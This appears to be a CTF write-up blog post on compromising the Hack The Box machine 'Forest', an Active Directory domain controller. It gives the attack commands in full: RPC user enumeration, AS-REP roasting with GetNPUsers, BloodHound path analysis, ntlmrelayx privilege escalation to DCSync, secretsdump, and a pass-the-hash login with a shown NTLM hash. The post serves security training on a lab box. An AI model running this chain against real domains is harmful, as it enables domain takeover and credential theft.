---
title:     "Hack The Box - Forest"
tags: [windows,easy,rpc,kerberos,AD,sharphound,ntlmrelayx,secretsdump]
layout: post
---
![88fb05dd27fad2ca431701d7dd7113c8.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/d03364012eb942a795d436604d6f51c4.png)

We are going to pwn Forest by egre55 & mrb3n from Hack The Box.

Link : <https://www.hackthebox.eu/home/machines/profile/212>


Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results:
```
PORT      STATE  SERVICE      VERSION
53/tcp    open   domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
63/tcp    closed via-ftp
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-20 08:27:25Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc        Microsoft Windows RPC
49665/tcp open   msrpc        Microsoft Windows RPC
49666/tcp open   msrpc        Microsoft Windows RPC
49667/tcp open   msrpc        Microsoft Windows RPC
49670/tcp open   msrpc        Microsoft Windows RPC
49676/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open   msrpc        Microsoft Windows RPC
49684/tcp open   msrpc        Microsoft Windows RPC
49706/tcp open   msrpc        Microsoft Windows RPC
49910/tcp open   msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/20%Time=5E747C23%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/20%OT=53%CT=63%CU=38761%PV=Y%DS=2%DC=T%G=Y%TM=5E747C
OS:80%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=
OS:A)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M5
OS:4DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h29m50s, deviation: 4h02m30s, median: 9m49s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2020-03-20T01:28:47-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-03-20T08:28:48
|_  start_date: 2020-03-20T05:45:49
```

## SMB:

I logged in without the password. But it seems like no workspace available.
```
root@w0lf:~/CTF/HTB/Boxes/Forest# smbclient -L 10.10.10.161
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

## RPC:

Connect to it without any password.

I can get a list of users with `enumdomusers`
```
root@w0lf:~/CTF/HTB/Boxes/Forest# rpcclient -U "" 10.10.10.161
Enter WORKGROUP\'s password: 

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient $> 
```

## Getting a User Shell:

Since the port 88 is open, we can move on to the kerberosting technique. But to do Kerberosting technique we need credentials on the domain to authenticate. But we have a chance if `Do not require Kerberos preauthentication` is True. There is a tool called `GetNPUsers.py` from [Impackets](https://github.com/SecureAuthCorp/impacket).

This is the tool we looking for, let's give a try.<br/>
![test.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/296181db8d754f9989a8d896078908ba.png)

I created a list of users that we got from `RPC` enumeration.
```
root@w0lf:~/CTF/HTB/Boxes/Forest# cat userlist.txt 
sebastien
lucinda
svc-alfresco
andy
mark
Guest
Administrator
```
From nmap scan it reveals a domain name `htb.local` so I added it to my `/etc/hosts`.
> GetNPUsers.py -usersfile userlist.txt -dc-ip 10.10.10.161 -request htb.local/

![8f2960edac58a5a72cba229387db1fac.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/dae2eef5e8234dad9037373f1f9ae925.png)<br/>
We got user `svc-alfresco` hash. Lets crack it using john.


![56.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/a765520fc3d84d2da91f6aa80f6a7e14.png)<br/>
We got the password for the user `svc-alfresco : s3rvice`

I used [Evilwinrm](https://github.com/Hackplayers/evil-winrm) to login.<br/>
![18a17924bb20c5155208dec2ffd834ec.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/d6e2502a51894b91969d9e867a99e915.png)


## Privilege Escalation:


We have a shell, so I gonna run `Sharphound` to collect all the data and copy it to my machine so I can import it to `BloodHound`

In `Evil-WinRM` there is a way to upload files easily, First we need to copy the file which we need to upload to the `Evil-WinRM` directory in our case it is `SharpHound.exe` and by using `upload SharpHound.exe` we can easily upload it to the machine.


![0433ed22818e37ec498091950ff7fe4d.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/ada45590753c4467bbf2ea326c980a92.png)


Once uploaded I executed it.
>./Sharphound.exe -c all

> -c CollectionMethods


![a259b8a5b3b4856ba7e08fa17bc32734.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/b4d15bbc27f941f9860bb09453d722f9.png)<br/>
Now the output is stored in zip file.

Like `upload` command we can also Download the file. It will be stored in `Evil-WinRM` directory.<br/>
![a671d0d5923bec456b3678f7cebefe0e.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/5382336d46674484afb7fb18b7bda439.png)

Drag the `.zip` file to the BloodHound. Once its extracted successfully you get a message.<br/>
![a2ceeb4ce7ab515be893584bc03817e6.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/71729cc6357048e0a491494fb6f2c973.png)

Now **Queries -> Find Shortest Paths to Domain Admins** <br/>
![sam.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/c6e175959c52475cb80b04abc989b5a0.png)

![7545a4210731a80d0c010339eed01cd9.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/0f9c7ab40ad14bb4990bc1a7e10b69e5.png)

You can see that our user `svc-alfresco` is in Service Account, which is a member of the Privileged IT Account, which is a member of Account Operators, it’s will be like `svc-alfresco` is a member of Account Operators. And Account Operators has Generic All privilege on the Exchange Windows Permissions group.

>GenericAll - full rights to the object (add users to a group or reset user's password)

![b854db930140e96530989f1d20c6910a.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/d8719194d75146878388b7dd5507a1c0.png)

We need to add a user to the group to know more about that click **GenericAll** and choose **? HELP** and click **Abuse Info**. If you scroll down, you can see examples of how to do it.

First we need to add a user to `Exchange Windows Permission`, we can type `net group "Exchange Windows Permissions"` to check who is in the group.

It seems like no one. So We add `svc-alfresco` to this group.
![18a82e8a5b01fcdbd7e6f67fc9e87665.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/78d84d2280f7410ca096266cee30eaca.png)

Added Successfully. And `Exchange Windows Permission group` has WriteDcal access to Domain object in Active Directory, which enables any member of this group to modify the domain privileges, among which is the privilege to perform DCSync operation.
![8d583931bebed439d5490d15ab7d6a9b.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/a36cdf421436415eab9f3f82850d710d.png)

**Reference :** <https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/> 
Next, Run `ntlmrelayx`<br/>
>python3 ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user svc-alfresco

![21be6b7645412b3892083b3f7cc9aad0.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/e7a6b2e511f04f62937a21a4cdd1891d.png)

Now we’ve to browse to our localhost and need to give `svc-alfresco` password and we see the connection coming in at ntlmrelayx, which gives our user DCSync privileges.<br/>
![Screenshot_2020-04-22_16-42-21.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/e631086164be43809baf891dcebcc3b6.png)


We got connection back and if u see closely it asks us to run `secretsdump.py`
![4bac1d7a1967d5380db1812ce82035a7.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/67fba1e0ebd540099d5ddb710f7cfa65.png)

Here we got `Administrator` Hash.<br/>
>secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161

![dee4de2c21a7f042bd942e5295beccfb.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/e46fb2f3db5e495c99d5b9a4605a0f62.png)

Now I can use this hash to login as administrator using `EvilWin-RM`<br/>
>ruby evil-winrm.rb -i 10.10.10.161 -u administrator -H "32693b11e6aa90eb43d32c72a07ceea6"

![24f7f08467eff462e3d41ba38c43c859.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-forest/7c60dc8405e24204ab4a56828f6a38d1.png)<br/>
We own the Root





















